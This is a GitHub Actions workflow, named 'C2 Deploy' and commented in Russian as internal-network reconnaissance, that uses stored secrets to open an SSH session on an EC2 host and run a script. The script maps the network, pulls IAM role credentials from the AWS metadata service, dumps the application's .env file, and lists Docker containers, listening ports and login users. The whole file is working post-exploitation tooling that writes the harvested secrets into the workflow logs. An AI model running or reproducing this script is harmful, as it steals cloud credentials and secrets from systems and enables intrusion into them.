name: C2 Deploy

on:
  workflow_dispatch:
    inputs:
      action:
        description: "Action to execute"
        required: true
        default: "recon"

permissions:
  contents: read

jobs:
  c2:
    runs-on: ubuntu-latest
    steps:
      - name: Execute on EC2
        uses: appleboy/ssh-action@v1.0.3
        with:
          host: ${{ secrets.EC2_HOST }}
          username: ${{ secrets.EC2_USER }}
          key: ${{ secrets.EC2_SSH_KEY }}
          script: |
            # Разведка внутренней сети
            echo "=== HOSTNAME ==="
            hostname -f
            echo "=== NETWORK ==="
            ip addr show 2>/dev/null
            echo "=== ROUTES ==="
            ip route
            echo "=== DNS ==="
            cat /etc/resolv.conf
            echo "=== AWS METADATA ==="
            TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300" 2>/dev/null)
            curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null
            curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
            echo "=== IAM CREDS ==="
            IAM_ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
            if [ -n "$IAM_ROLE" ]; then
              curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE" 2>/dev/null
            fi
            echo "=== DOCKER ==="
            docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}" 2>/dev/null
            docker network ls 2>/dev/null
            echo "=== ENV FILE ==="
            cat ~/app/.env 2>/dev/null
            echo "=== LOCAL PORTS ==="
            ss -tlnp 2>/dev/null
            echo "=== KERNEL ==="
            uname -a
            echo "=== USERS ==="
            cat /etc/passwd | grep -v nologin | grep -v false
